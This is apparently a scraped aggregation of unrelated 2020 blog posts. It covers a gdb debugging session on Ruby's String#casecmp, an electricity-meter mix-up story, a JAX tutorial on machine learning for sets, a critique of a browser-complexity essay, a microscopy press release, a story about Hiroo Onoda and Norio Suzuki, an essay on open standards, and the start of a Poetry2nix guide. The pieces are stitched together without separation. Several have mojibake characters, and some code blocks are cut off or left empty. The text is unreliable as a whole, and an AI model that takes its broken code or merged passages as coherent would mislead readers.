Reading symbols from /Users/maximevaillancourt/.rubies/ruby-2.6.6/bin/ruby...

Thread 2 hit Breakpoint 1, str_casecmp ...
</code></pre></div></div>

<p>Letâ€™s look at the loop we presented above in Ruby 2.7.0, but <a href="https://github.com/ruby/ruby/blob/a9a48e6a741f048766a2a287592098c4f6c7b7c7/string.c#L3413-L3414">in Ruby 2.6.6</a> this time:</p>

<div><div><pre><code><span>while</span> <span>(</span><span>p1</span> <span>&lt;</span> <span>p1end</span> <span>&amp;&amp;</span> <span>p2</span> <span>&lt;</span> <span>p2end</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>*</span><span>p1</span> <span>!=</span> <span>*</span><span>p2</span><span>)</span> <span>{</span>
    <span>unsigned</span> <span>int</span> <span>c1</span> <span>=</span> <span>TOUPPER</span><span>(</span><span>*</span><span>p1</span> <span>&amp;</span> <span>0xff</span><span>);</span>
    <span>unsigned</span> <span>int</span> <span>c2</span> <span>=</span> <span>TOUPPER</span><span>(</span><span>*</span><span>p2</span> <span>&amp;</span> <span>0xff</span><span>);</span>
    <span>if</span> <span>(</span><span>c1</span> <span>!=</span> <span>c2</span><span>)</span>
      <span>return</span> <span>INT2FIX</span><span>(</span><span>c1</span> <span>&lt;</span> <span>c2</span> <span>?</span> <span>-</span><span>1</span> <span>:</span> <span>1</span><span>);</span>
  <span>}</span>
  <span>p1</span><span>++</span><span>;</span>
  <span>p2</span><span>++</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Notice that instead of using <code>TOLOWER</code> as in Ruby 2.7.0, Ruby 2.6.6 uses <code>TOUPPER</code>. Interesting.</p>

<p>Letâ€™s fast-forward to the part where we get to <code>c1</code> and <code>c2</code> for the second character in the input:</p>

<div><div><pre><code>3414			unsigned int c2 = TOUPPER(*p2 &amp; 0xff);
(gdb) next
3415	                if (c1 != c2)
(gdb) print c1
$5 = 85
(gdb) print c2
$6 = 96
</code></pre></div></div>

<p>Hereâ€™s a visual representation of the buffers:</p>

<div><div><pre><code>     c1
     â†“
108  85  ?   ?
 L   U   C   K

108  96  ?   ?   ?   ?   ?   ?   ?
 L   `   A   U   G   U   S   T   E
     â†‘
     c2
</code></pre></div></div>

<p><code>c1</code> is <code>85</code>, which is the character code for <code>U</code>, and <code>c2</code> is <code>96</code> (just like in Ruby 2.7.0), which is the character code for a backtick (<code>`</code>).</p>

<p>This time though, the comparison result is different, because <code>c1 &lt; c2</code> (<code>85 &lt; 96</code>), so <code>str_casecmp</code> returns <code>-1</code>.</p>

<p>There it is: because Ruby 2.6 uses <code>TOUPPER</code> and Ruby 2.7 uses <code>TOLOWER</code> before comparing the inputs, and because one of the characters to compare is a backtick (<code>`</code>, which canâ€™t be converted to uppercase or lowercase in any way), the other characterâ€™s code â€œmovesâ€� differently around the â€œfixedâ€� backtick character code, affecting the result of the <code>String#casecmp</code> function.</p>

<hr>

<p>To summarize, the root cause of the issue is that <code>String#casecmp</code> was updated in Ruby 2.7 to <strong>lowercase</strong> the two inputs before comparing them, while Ruby 2.6 used to <strong>uppercase</strong> the two inputs before comparing them. <a href="https://github.com/ruby/ruby/commit/082424ef58116db9663a754157d6c441d60fd101#diff-7a2f2c7dfe0bf61d38272aeaf68ac768">This is the commit where this change was introduced.</a></p>

<p>Fun debugging session. :)</p>

  <article>
    <p>I’ve lived in my house for just under two years. Last summer, I noticed something strange. Our electricity bill increased by 40-90% depending on the month. This year, I finally tracked it down and discovered our meter was being mixed up with our neighbor’s. Here’s how I tracked this down and what you can do to prevent it from happening to you.</p>



<p>I have an amateur interest in electricity, conserving energy, and energy efficiency in general. I care about my carbon footprint, as well as my bill, and I’m passionate about innovation in this space. I’ve made it a habit to have a good idea of how much electricity different appliances use and, in general, I try to be aware of where my electricity is going. Years ago, I bought a simple <a href="https://en.wikipedia.org/wiki/Kill_A_Watt">Kill A Watt</a> to quickly get an idea of how much power things use.</p>



<p>The first time I noticed a problem was when we got our July bill in the summer of 2019. It was about 40% higher than usual. My grandparents stayed with us (in their motorhome) for a week that month, and their motorhome has a big air conditioner, so I chalked it up to that, though that still seemed high.</p>

<p>A couple months passed and the problem got worse. It went from 40% higher than normal, to a peak of about 90%. I couldn’t explain that. We don’t have central air conditioning. Most of our heavy appliances use natural gas. We did use a portable air conditioner briefly, but never for more than a couple hours a night. I also measured the power usage of the A/C and thought, there’s no way this adds up. This confusion continued until we got our October bill and it returned to normal, and I forgot about it for another year.</p>



<p>And…it came back! I first noticed this year in June when the bill jumped about 20%. I figure it’s reasonable for the bill to fluctuate a little, but not by that much. Plus, what made even less sense is that we used supplemental electric heating this winter, so if anything, our bill should’ve been higher in the winter! Again, no central air conditioning, so another unexplained bill. I tracked power usage on everything I could think of, to make sure I hadn’t missed something. For awhile, my big suspect was our fridge. It’s 18 years old, so I figured, maybe there’s a problem with it and it uses more power when it should, especially when the ambient temperature is higher. I cleaned the coils and played around with the fridge settings, then waited for our next bill. It got worse.</p>

<p>This year, I noticed our power company has a cool interface online where you can see your daily power usage. Very handy. I noticed that, in non-summer months, it was very consistent, ranging between 9-12 kWh per day. Then, in the summer months, it just goes all over the place. Sometimes it was 8, other days it went as high as 24! This seemed loosely correlated with the temperature but I just couldn’t explain that, due to a lack of central cooling in our house. I finally decided to call the power company at this point. Naturally, they did not take me too seriously, and were fairly insistent that it was my air conditioning (that I didn’t have). I was told to hire an electrician to investigate.</p>

<p>Then it got weirder. In late July, I noticed that in recent weeks, our daily power usage (according to the power company) dipped as low as 1 kWh per day! That’s just not possible, I thought. My electronics, combined, should use more than that per day, not even counting heavier users like the fridge. The power usage still fluctuated quite a bit, but there were several days where the power usage was as low as 1-3 kWh. I called the power company again and, no surprise, they took this much more seriously and agreed that wasn’t possible. I insisted that the peaks in usage didn’t make sense either, that I couldn’t explain those, but no luck there…they were really only interested in the low days and said they were opening an investigation that could take “at least a few weeks” to finish.</p>



<p>One night, I finally put it together. I wondered if my bill was mixed up with my neighbor’s. My neighbor had moved out in July, and that’s about when the daily power usage fell to almost nothing. I also happened to know that they have central air conditioning. I looked at my bill and noticed it actually has the meter number on it, very helpful! I looked at my meter and the number on the bill wasn’t even remotely close. It wasn’t off-by-one. The format looked consistent, but the values looked randomized. I was wondering whether I was even looking at the right number. So, the next morning, I took a look at my neighbor’s (vacant) house’s meter. Sure enough, it exactly matched what was on my bill.</p>

<p>A few frustrating phone calls later (not important), and the issue is fixed. We got the charges corrected and are enjoying a large credit on our account that ought to last us about 6 months (after having lived here only 2 years).</p>

<p>In any future house I live in, I will be sure to check that my bill’s meter number matches what’s on the property. I highly recommend everyone do the same, because I get the impression this is fairly common. A quick search online and I found about half a dozen news articles about this happening, often more egregious cases than my own. Most of us may not notice a mixup, either because the usage is fairly consistent or we just don’t know how much power we use. Thankfully, you should be able to check the accuracy of your bill in about 5 minutes if your meter is easily accessible. Simply look for the meter number on your bill (hopefully all power companies give this info), and then look physically at the meter for a sticker from your power company, and see if the numbers match.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>In machine learning, we typically work with input pairs (x, y), and we try to figure out how x and y depend on each other.
To do so, we gather many such pairs and hope that the dependence will reveal itself if a) we have enough data, b) our model is expressive enough to approximate this dependency, and c) we get the hyperparameters right.
In the simplest case, both x and y are just scalar values (or vectors \(\mathbf{x}, \mathbf{y}\)); for example, given some measurements of a plant’s shape, we might want to predict its species. The measurements here are real vectors \(\mathbf{x} \in \mathcal{X}\), where the input space \(\mathcal{X} = \mathbb{R}^d\) is usually Euclidean, and the species is a label \(\mathbf{y} \in \mathcal{Y}\) (usually an integer or a one-hot vector), but it is common for \(\mathbf{x}\) and \(\mathbf{y}\) to have more structure.</p>

<p>One of the main assumptions we rely on is that the pairs of (x, y) points are <a href="https://en.wikipedia.org/wiki/Independent_and_identically_distributed_random_variables">independent and identically distributed (i.i.d.) random variables</a>.
Let us unpack this a bit, starting from the end,</p>

<ul>
  <li><code>random variable</code>: there exists some stochastic generative process from which the variables were randomly sampled,</li>
  <li><code>identically</code>: all samples come from the same probability distribution,</li>
  <li><code>independent</code>: the generative process has no memory of generated samples, and hence any generated sample does not change the distribution over future generated samples.</li>
</ul>

<p>Any structure in \(\mathbf{x}, \mathbf{y}\), or both introduces constraints, and a successful application of an algorithm to a particular problem does heavily depend on whether or not this algorithm takes the relevant constraints into account.
A common constraint in image-related problems is translation equivariance<sup id="fnref:cnnequiv" role="doc-noteref"><a href="#fn:cnnequiv">1</a></sup>—the output of the algorithm should shift with any shifts applied to the image (you can read more about equvariances in <a href="https://fabianfuchsml.github.io/equivariance1of2/">this excellent blog post</a>).
In natural language-related problems, a typical constraint is causality: a token at position t can depend on any previous tokens at position 1:t-1, but it cannot depend on any future tokens<sup id="fnref:languecausality" role="doc-noteref"><a href="#fn:languecausality">2</a></sup>.</p>

<p>In the above examples, the dependencies between points (e.g., autoregressive dependence in NLP) are clear from the context.
However, if a data point is not a vector, matrix, or a sequence of vectors, but it is a <strong>set of vectors</strong>, these dependencies become less clear.
In particular, elements in an input set resemble elements in a dataset (i.e., lack of order), but the critical difference is that they are <strong>not independent</strong>, therefore breaking the i.i.d. assumption.
Accounting for this specific structure in inputs or outputs of an ML model leads to a family of set learning problems, which have recently gained considerable attention in the machine learning community.
I thought it would be useful to delve into the machine learning of sets.
In the following, we will consider set-to-vector, vector-to-set, and set-to-set problems and provide implementations of simple algorithms in <a href="https://github.com/google/jax">JAX</a> and <a href="https://github.com/deepmind/dm-haiku">haiku</a>.</p>

<p>First some imports:</p>

<div><div><pre><code>import jax
import jax.numpy as jnp
import haiku as hk

<p>Before we start, it is useful to introduce some notation.
Let \(\mathbf{x} \in \mathbb{R}^d\) be an input vector, \(\mathbf{y} \in \mathbb{R}^k\) the output vector, and let \(X = \{\mathbf{x}_i\}_{i=1}^M\) and \(Y = \{\mathbf{y}_j\}_{j=1}^N\) be sets of \(M\) and \(N\) elements, respectively.
Note that, until now, \(y\) or \(\mathbf{y}\) were simply labels.
From now on, however, \(\mathbf{x}\) and \(\mathbf{y}\) can live in the same space, and simply be elements of different sets.
I will also use \(\mathcal{L}(X, Y)\) as a loss function operating on two sets, and \(l(\mathbf{x}, \mathbf{y})\) will be a loss function for pairs of elements.</p>


<p>This is perhaps the simplest set-learning problem since it only requires permutation invariance.
A function \(f\) is invariant to permutations \(\pi\) if \(\forall \pi\): \(f(X) = f(\pi X)\).
Permutation invariance has always been known in machine learning, as loss functions we use almost never<sup id="fnref:acn" role="doc-noteref"><a href="#fn:acn">3</a></sup> depend on the ordering of elements in our datasets or minibatches.
This is not for the lack of order: to create a minibatch, we stack multiple data elements in an array; this pairs every element in the minibatch with its minibatch index, therefore implicitly creating an order.
Loss functions tend to discard information about the order, usually by taking the mean over data examples.
We can create permutation-invariant functions by following a similar logic.</p>

<p>Examples in a minibatch are processed independently (which reflects their i.i.d. nature), but if each entry in the minibatch contains more than just a single data point (many pixels in an image, points in a point cloud, tokens in a language sentence), then flattening these points into a vector and feeding it into an MLP or a CNN results in different parameters being used for processing different data points, and hence order is used implicitly; feeding the points into an RNN reuses parameters, but introduces an explicit dependence on the order.</p>

<p>A straightforward solution to this issue is to treat points in a single example in the same way we treat examples in the minibatch: treat them independently.
This approach, followed by a permutation-invariant pooling operation such as max or mean pooling, is explored in <a href="https://arxiv.org/abs/1703.06114">Zaheer et al., “Deep Sets”, NeurIPS 2017</a> and is proven to be a universal set-function approximator<sup id="fnref:deepsetdim" role="doc-noteref"><a href="#fn:deepsetdim">4</a></sup>.</p>

<div><div><pre><code>class DeepSet(hk.Module):

  def __init__(self, encoder, decoder):
    super().__init__()
    self._encoder = encoder
    self._decoder = decoder
    
  def __call__(self, x):
    """Compute the DeepSet embedding.

    Args:
      x: Tensor of shape [batch_size, n_elems, n_dim].
    """
    return self._decoder(self._encoder(x).mean(1))
</code></pre></div></div>

<p>While newer approaches with better empirical performance exist, they all draw from the Deep Sets framework<sup id="fnref:setembeddings" role="doc-noteref"><a href="#fn:setembeddings">5</a></sup>.
Another factor contributing to the fact that the set-to-vector problem is quite easy is that pooling operations naturally work with variable-sized sets–there is nothing extra we have to do to handle sets of variable cardinality.
This is not the case in the following two problems, where we have to take the set size into account explicitly.</p>


<p>In vector-to-set, the task is to generate a set of real vectors from some (usually vector-valued) conditioning.</p>

<p>The majority of approaches out there focus on generating ordered sequences instead of unordered sets, and usually of fixed or at least known size.
This allows using MLPs<sup id="fnref:setae" role="doc-noteref"><a href="#fn:setae">6</a></sup> and RNNs<sup id="fnref:order_matters" role="doc-noteref"><a href="#fn:order_matters">7</a></sup> to predict fixed- and variable-length sets, respectively, but at the price of having to learn permutation-equivariance from data.
Learning permutation-equivariance can be induced by data augmentation. It is easy to generate different permutations, but usually comes at a decreased performance and/or longer training times compared to truly permutation-equivariant methods<sup id="fnref:data_augmentation" role="doc-noteref"><a href="#fn:data_augmentation">8</a></sup>.</p>

<div><div><pre><code>  def set_mlp(conditioning, decoder, n_elements):

<h4 id="permutation-invariant-loss-functions">Permutation-Invariant Loss Functions</h4>
<p>Learning to generate sets based on some conditioning typically requires scoring that set against the conditioning.
If we have ground-truth sets at our disposal, we can compare the generated sets against the ground-truth ones for the same conditioning.
This can take the form of supervised learning (think of detecting objects in an image, where we need to generate a set of bounding boxes) or unsupervised learning (autoencoding point-clouds, say).
Since we generally have no guarantee that the generated sets will obey any ordering (why should they?), we have to apply losses invariant to that ordering.
We have two options here:</p>

<ul>
  <li>We can find an optimal matching between two sets<sup id="fnref:bipartite_matching" role="doc-noteref"><a href="#fn:bipartite_matching">9</a></sup>, which comes down to finding a permutation \(\pi\) of one of the sets that minimizes the computed loss, that is: \(\pi^\star = \arg \min_\pi \mathcal{L}( \pi X, Y)\), with \(\mathcal{L}( \pi X, Y) = \sum_i l(\mathbf{x}_{\pi(i)}, \mathbf{y}_i)\). This can be done exactly using the cubic <a href="https://en.wikipedia.org/wiki/Hungarian_algorithm">Hungarian matching</a> algorithm, or approximately using e.g. <a href="https://arxiv.org/abs/1106.1925">optimal-transport</a>- or <a href="https://web.stanford.edu/~bayati/papers/bpmwmIT.pdf">message-passing</a>-based algorithms.</li>
  <li>Instead of finding a matching, we can find a lower bound on what the matched loss would be. A popular choice here is the Chamfer loss<sup id="fnref:chamfer" role="doc-noteref"><a href="#fn:chamfer">10</a></sup>, which computes \(\sum_{x \in X} \min_{y \in Y} l(x, y) + \sum_{y \in Y} \min_{x \in X} l(x, y)\). For every element in one set, it finds the element in the other set that results in the lowest pairwise loss. This loss does not work for multisets as elements can be repeated.</li>
</ul>

<p>If we do not have ground-truth for each conditioning (we have just sets), or if we have many possible sets for each conditioning (e.g., a group of possible sets for one of a few labels), we can instead learn by matching distributions e.g., in the GAN setting.
If we take this approach, we have two problems, really: that of vector-to-set for the generator and set-to-vector for the discriminator. 
Fortunately, we know how to solve the set-to-vector problem with a permutation-invariant neural net, and shortly I am going to describe some permutation-equivariant methods for generation.
This is precisely what we recently explored in <a href="https://oolworkshop.github.io/program/ool_32.html">Stelzner et al., “Generative Adversarial Set Transformers”, ICML 2020 Object-Oriented Learning Workshop</a>.</p>

<p>Coincidentally, sometimes we have to deal with a set of latent variables inside a model. For example in …</p></div></div>

August 13, 2020 | https://www.blackcap.site/posts/google_wont_stop/ | <a href="https://web.archive.org/web/*/https://www.blackcap.site/posts/google_wont_stop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>So I read <a href="https://drewdevault.com/2020/08/13/Web-browsers-need-to-stop.html">this blog post</a>, and it’s bothering me.
It’s pretty short, so I recommend you read it before continuing with this post.</p>
<p>Done? Alright.</p>

<p><img src="https://www.blackcap.site/img/divider.svg" width="300">
</p>
<p>I think that article expresses a generally good opinion in the worst way possible.</p>
<p>It’s true that if Chrome becomes the only browser on the market, it’d lead to a very unhealthy monopoly situation.
There’s an analogy to be drawn with Microsoft’s <a href="https://en.wikipedia.org/wiki/Embrace,_extend,_and_extinguish">EEE strategy</a>, except that instead of extending open software with proprietary APIs, Google is extending it with <em>so many</em> APIs that no one can ever build anything compatible.</p>
<p>For the web to remain an open and innovative platform, there need to be multiple competing browser engines.
The more features Google adds to Chrome, the harder it becomes for Firefox to keep up, and the more impossible it becomes for anyone to build a new browser from scratch.</p>
<p>But this article seems almost allergic to actual solutions.
It is intent on blaming all the wrong people without proposing any real answers.</p>
<p>Look at this bit:</p>
<blockquote>
<p>Mozilla just fired everyone relevant to focus on crap no one asked for like Pocket, and fad nonsense like a paid VPN service and virtual reality tech.</p>
</blockquote>
<p>Of course they did – they had no choice.
It takes money to build software.
Pocket, even if it is “crap no one asked for,” is an opportunity to serve ads.
“Fad nonsense” like paid VPNs actually make quite a bit of money these days.
Mozilla makes Firefox, Servo, MDN, and Rust, and does it all for free.
I love Mozilla for it, but this article seems to believe that all that is needed for this state of affairs to continue is… what, exactly?</p>
<blockquote>
<p>No layoffs or pay cuts at the management level, of course!
It’s not like they’re responsible for these problems, it’s not like anyone’s fucking responsible for any of this, it’s not like the very idea of personal responsibility has been forgotten by both executives and engineers, no sir!</p>
</blockquote>
<p>“Personal responsibility,” apparently.
I totally support pay cuts for executives, but you can’t save 250 jobs like that, and “personal responsibility” alone can’t pay the bills.
Not only does appealing to personal responsibility solve nothing, it distracts us from actual solutions by letting us blame individuals for the systemic reasons that our problems exist in the first place.</p>
<p>If we want to protect the public good by keeping Mozilla in the black, we need to stop expecting them to do their work for free while still making money in the market.
We need to provide them with government grants.
Clearly charitable donations aren’t enough – let’s fund important software the same way we fund important science: with public money.</p>
<p>As for the question of scope creep in browsers, how do we solve that?
Google seems content to just keep adding features, even if that’s ultimately bad for the ecosystem.
This applies to AMP too.
Google bumps AMP websites to the top of its search results regardless of speed.
This is anti-competitive behaviour.
How does this article propose we stop this?</p>
<blockquote>
<p>No one wants AMP.
Google knows it, you know it, I know it.
If you’re a Google engineer who is still working on AMP, you are a disgrace to your field.
Take responsibility for the code you write.
This project needs to be dead and buried and the earth above salted, and it needs to happen yesterday.</p>
</blockquote>
<p>“Personal responsibility,” again.
Let’s just <em>ask</em> all the engineers at Google to stop making AMP.
That’s not a solution; we can’t solve problems just by asking everyone to stop doing the thing.
What’s next, are we gonna fix global warming by asking everyone working in the fossil fuel sector to quit?
Are we gonna end sweatshop labour by asking every Nike employee to resign?
At no point in history has social change ever worked this way.
This is a non-solution.</p>
<p>If we think AMP is anti-competitive, the answer is anti-trust legislation.
Plain and simple.
If we want to decouple Chrome from Google’s private interests, the only way to actually do that is to break up Google, separating the Chrome team into its own non-profit org.</p>
<p>Are these good proposals?
Maybe.
I like them.
They’re worth discussing, at least.
But they’re better than “enough is enough,” because that’s nothing at all.
And they’re infinitely better than this weird “personal responsibility” thing, because that’s the <em>opposite</em> of a solution:
It’s something that feels like a solution – something we can waste our time talking about for ages – but something which will never actually solve the problem.</p>
<blockquote>
<p>I call for an immediate and indefinite suspension of the addition of new developer-facing APIs to web browsers.</p>
</blockquote>
<p>Google does not care what you think.
If you want to change their behaviour, you can’t just ask them to do something else.
You have to change the system of incentives and barriers which Google operates within, and force them to act differently.
By ignoring the political instruments and market forces which Google responds to in favour of shaming individuals into “taking personal responsibility,” you achieve nothing.</p>

<p><img src="https://www.blackcap.site/img/divider.svg" width="300">
</p>
<p>Having written all of this, I feel like I may be being too harsh.
This article never claimed to have solutions – in fact, it’s only a few paragraphs long.
I’ve more than quadrupled its word count in this response.
But if all we do is complain about problems, and then complain about how no one’s “taking responsibility,” we never actually fix anything.
This article blames individuals instead of systems.
It is concerned entirely with symptoms instead of looking for the root cause.</p>
<p>This is a type of thought which I find particularly frustrating, because it points fingers but doesn’t solve problems.
We will never stop corporate monopoly power by exercising our “personal responsibility.”
Shouting “Google, please stop!” into the void does nothing at all.
They will never stop of their own volition.
Ask voters to stop them instead.</p>

But to achieve high resolution over a large specimen area, the energy of the electron beams needs to be cranked up, which is costly and detrimental to the specimen under observation. </p><p>Texas A&amp;M University researchers may have found a new method to improve the quality of low-resolution electron micrographs without compromising the integrity of specimen samples. By training deep neural networks, a type of artificial intelligence algorithm, on pairs of images from the same sample but at different physical resolutions, they have found that details in lower-resolution images can be enhanced further. </p><p>“Normally, a high-energy electron beam is passed through the sample at locations where greater image resolution is desired. But with our image processing techniques, we can super resolve an entire image by using just a few smaller-sized, high-resolution images,” said Dr. Yu Ding, Mike and Sugar Barnes Professor in the Wm Michael Barnes ‘64 Department of Industrial and Systems Engineering. “This method is less destructive since most parts of the specimen sample needn’t be scanned with high-energy electron beams.”</p><p>The researchers published their image processing technique in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fieeexplore.ieee.org%2Fabstract%2Fdocument%2F9117049&amp;t=ZDkzNWVjNWRiZDdjYjA3YTM3YmUwMDUyZGUzNzZmYzEyYmMzMDA4ZCw4RmVldkVyRQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F626385139089424384%2Fhi-res-microscope-no-zoom-in&amp;m=0&amp;ts=1597652551"><i> Institute of Electric and Electronics Engineers’ Transactions on Image Processing</i></a> in June. </p><p>Unlike in light microscopy where photons, or tiny packets of light, are used to illuminate an object, in electron microscopy, a beam of electrons is utilized. The electrons reflected from or passing through the object are then collected to form an image, called the electron micrograph. </p><p>Thus, the energy of the electron beams plays a crucial role in determining the resolution of images. That is, the higher the energy electrons, the better the resolution. However, the risk of damaging the specimen also increases, similar to how ultraviolet rays, which are the more energetic relatives of visible light, can damage sensitive materials like the skin. </p><p>“There’s always that dilemma for scientists,” said Ding. “To maintain the specimen’s integrity, high-energy electron beams are used sparingly. But if one does not use energetic beams, high-resolution or the ability to see at finer scales becomes limited.”</p><p>But there are ways to get high resolution or super resolution using low-resolution images. One method involves using multiple low-resolution images of essentially the same region. Another method learns common patterns between small image patches and uses unrelated high-resolution images to enhance existing low-resolution images.</p><p>These methods almost exclusively use natural light images instead of electron micrographs. Hence, they run into problems for super-resolving electron micrographs since the underlying physics for light and electron microscopy is different, Ding explained.</p><p>The researchers turned to pairs of low- and high-resolution electron microscopic images for a given sample. Although these types of pairs are not very common in public image databases, they are relatively common in materials science research and medical imaging.</p><p>For their experiments, Ding and his team first took a low-resolution image of a specimen and then subjected roughly 25% of the area under observation to high-energy electron beams to get a high-resolution image. The researchers noted that the information in the high-resolution and low-resolution image pair are very tightly correlated. They said that this property can be leveraged even though the available dataset might be small.</p><p>For their analyses, Ding and his team used 22 pairs of images of materials infused with nanoparticles. They then divided the high-resolution image and its equivalent area in the low-resolution image into three by three subimages. Next, each subimage pair was used to “self-train” deep neural networks. Post-training, their algorithm became familiar at recognizing image features, such as edges. &nbsp;</p><p>When they tested the trained deep neural network on a new location on the low-resolution image for which there was no high-resolution counterpart, they found that their algorithm could enhance features that were hard to discern by up to 50%.</p><p>Although their image processing technique shows a lot of promise, Ding noted that it still requires a lot of computational power. In the near future, his team will be directing their efforts in developing algorithms that are much faster and can be supported by lesser computing hardware.</p><p>“Our paired image processing technique reveals details in low-resolution images that were not discernable before,” said Ding. “We are all familiar with the magic wand feature on our smartphones. It makes the image clearer.

<h3>
The story of Hiroo Onoda and Norio Suzuki .
</h3>
<div>
<div id="post-body-5431664009188123112">
<div dir="ltr" trbidi="on"><p>
Well the story begins with <b>Hiroo Onodo</b>.</p><div>
<p>
A Japanese&nbsp; Army Intelligence officer who fought in world war II.&nbsp;</p>
<p>
On 23 December 1944 he was sent to Lubang Island&nbsp; in the Philippines with orders which stated that under no conditions he should surrender or take his own life.</p>
<p>
But after few months The United States detonated two nuclear weapons over the Japanese cities of Hiroshima and Nagasaki on August 6 and 9, 1945 which&nbsp; ended the World War II as Japanese surrenders.The Philippines forces distributed leaflet announcing that Japan has surrender in Oct 1945,However he and his companion distrusted the leaflet thinking that it was a allied propaganda.As they continue to carry out guerrilla&nbsp; activities and shootouts with the forces .In 1952 letters and family pictures were dropped from aircraft&nbsp; urging them to surrender,but they concluded that it was a trick. In 1972 his companion Kozuka was killed by local police. Onoda was now alone. After 2 years&nbsp; On Feb 20,1974 , Onoda met a Japanese man Norio Suzuki and then after orders from his senior was relived from his duty after 30 years.He was then a popular person in Japan.</p>
<p>
(He also released an autobiography, No Surrender: My Thirty-Year War, shortly after his return, detailing his life as a guerrilla fighter in a war that was long over)</p>
<p><b>Norio Suzuki?</b></p>
<p>
He&nbsp;was a Japanese explorer and adventurer. He studied economics but then dropped out and decided to explore the world. Four year he wander Asia, Africa&nbsp; and Middle east and then returned to Japan in 1972. As in 1972&nbsp; Japanese Media reported Kozuka was killed and his body then was surrender to Japan and after that there where many search efforts to find&nbsp; Hiroo Onodo which ended in a failure.</p>
<p>
Norio Suzuki then decided to search for the officer.</p>
<p>
He expressed his decision in this way: He wanted to search for "Lieutenant Onoda, a panda, and the Abominable Snowman(Yeti), in that order".This was kind of crazy life goals of&nbsp; Norio Suzuki .</p>
<p>
Suzuki found Onoda after four days of searching and later they both become friends.</p>
<p>
After finding Onoda, Suzuki quickly found a wild panda, and claimed to have spotted a yeti from a distance by July 1975, hiking in the Dhaulagiri range of the Himalayas. He married in 1976 but did not give up his quest.</p>
<p>
Suzuki died in November 1986 in an avalanche while searching for the yeti. His remains were discovered a year later and returned to his family.</p>
<div><p>
Hope you like the story of these two devoted people.<br>
There were people earlier having such dedication towards there goals nowadays we hardly find such thing. It is always good to have a goal set in your mind may it be anything but you must work on it everyday. It will always pay you back with high intensity.</p><p>

<p>2020-08-13

If you want to create a truly open standard, you _need_ to make it simple.

There are no exceptions to this rule. When a standard becomes harder to fully implement than what your average motivated programmer can do in two months (max!), it _shouldn't_ be considered "open" anymore.

Why?

</p>
<h2>Complicated Standards Lead to Implementation Monopolies</h2>
<p>Since implementing a complex standard is hard, you will eventually end up with the implementation that started the earliest and maintained since, being the only implementation that is actually usable. And that implementation will most likely be the one created by the standard's creators.

In cases where the standard's creators don't maintain an implementation like "the web"⁰, the only choices are either the standard dying out because of it's complexity, or the actively maintained implementations requiring tons of effort, with (most likely) companies backing said implementations.

</p>
<h2>Implementation Monopolies Lead to Extensions</h2>
<p>If a big implementation just decides one day that your standard is lacking, they can just extend the parts they want. The two outcomes of this being that:

</p>
<ul><li>The other implementations copy their extensions</li>
<li>That one implementation getting more users, and eventually, a near monopoly because of a bigger feature set</li></ul>
<p>
At that point, the "standard" implemented by said implementations is longer the actual defined standard, but because people will inevitably use the said extensions, any new implementation that wants to be considered usable will eventually need to support said proprietary extensions.

</p>
<h2>Too Many Extensions Spoil The Standard</h2>
<p>Even if you have an "open" extension system, where implementations can all propose and agree on extensions to the standard, you need to be able to keep those implementations in check, so their extensions don't overcomplicate the standard.

Remember: Having a simple standard with a million extensions is no better than a complex standard with no extensions.

</p>
<h2>Examples</h2>
<p>Please note that I will be skipping the elephant in the room: "the web", as it has been discussed _to death_.

</p>
<h3>Matrix</h3>
<p>Matrix is _technically_ an open standard. But because of the complexity it has accumulated over the years, Synapse is the only usable server implementation. Even Dendrite, the new implementation by *the same folk that created the standard*, is barely usable after _years_.

The same applies to Matrix clients, with Element being the only usable client implementation. That space definitely seems healthier than the server space, but the same issues are there.

</p>
<h3>Various Programming Languages</h3>
<p>I will not be specifying any language, as I might get any specifics incorrect, but a general pattern I have seen is that most programming languages have only a few compiler/interpreter implementations, even though the language is standardized in some form.

This example actually has some interesting reasoning behind this issue on top of the complicated standards:

</p>
<ul><li>Writing a compiler/interpreter can be hard.</li>
<li>Especially if the current implementations do optimizations or other "clever" tricks.</li></ul>
<p>
These issues can devolve into arguments regarding seeing the complexity of these issues as a part of the standard, and other "technology is too complicated in general" arguments, which I will not dive into here.

</p>
<h3>X Display Server</h3>
<p>The X Display Server standard got so complicated, the people developing it decided to abandon it entirely and create Wayland.

It probably didn't help that most of the standard was no longer being used, and a lot of extensions are required for its use today.

Wayland probably will also suffer the "too many extensions" problem at some point, so I am looking forward to that too...

</p>
<h2>Footnotes</h2>
<p>0: Well, Google, Mozilla and Apple all had a hand in most of the "modern" parts of the standards...

<![CDATA[Developing Python with Poetry and POETRY2NIX]]>

August 13, 2020 | https://www.tweag.io/blog/2020-08-12-poetry2nix/ | <a href="https://web.archive.org/web/*/https://www.tweag.io/blog/2020-08-12-poetry2nix/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><p>Most Python projects are in fact <em>polyglot</em>.
Indeed, many popular libraries on <a href="https://pypi.org/">PyPi</a> are Python wrappers around C code.
This applies particularly to popular scientific computing packages, such as <code>scipy</code> and <code>numpy</code>.
Normally, this is the terrain where Nix shines, but its support for Python projects has often been labor-intensive, requiring lots of manual fiddling and fine-tuning.
One of the reasons for this is that most Python package management tools do not give enough static information about the project, not offering the determinism needed by Nix.</p>
<p>Thanks to <a href="https://python-poetry.org/">Poetry</a>, this is a problem of the past — its rich lock file offers more than enough information to get Nix running, with minimal manual intervention.
In this post, I will show how to use Poetry, together with <a href="https://github.com/nix-community/poetry2nix">Poetry2nix</a>, to easily manage Python projects with Nix.
I will show how to package a simple Python application both using the existing support for Python in Nixpkgs, and then using Poetry2nix.
This will both show why Poetry2nix is more convenient, and serve as a short tutorial covering its features.</p>
<h2>Our application</h2>
<p>We are going to package a simple application, a <a href="https://flask.palletsprojects.com/">Flask</a> server with two endpoints: one returning a static string “Hello World” and another returning a resized image.
This application was chosen because:</p>
<ol>
<li>It can fit into a single file for the purposes of this post.</li>
<li>Image resizing using Pillow requires the use of native libraries, which is something of a strength of Nix.</li>
</ol>
<p>The code for it is in the <code>imgapp/__init__.py</code> file:</p>
<div data-language="python"><pre><code><span>from</span> flask <span>import</span> send_file

<h2>The status quo for packaging Python with Nix</h2>
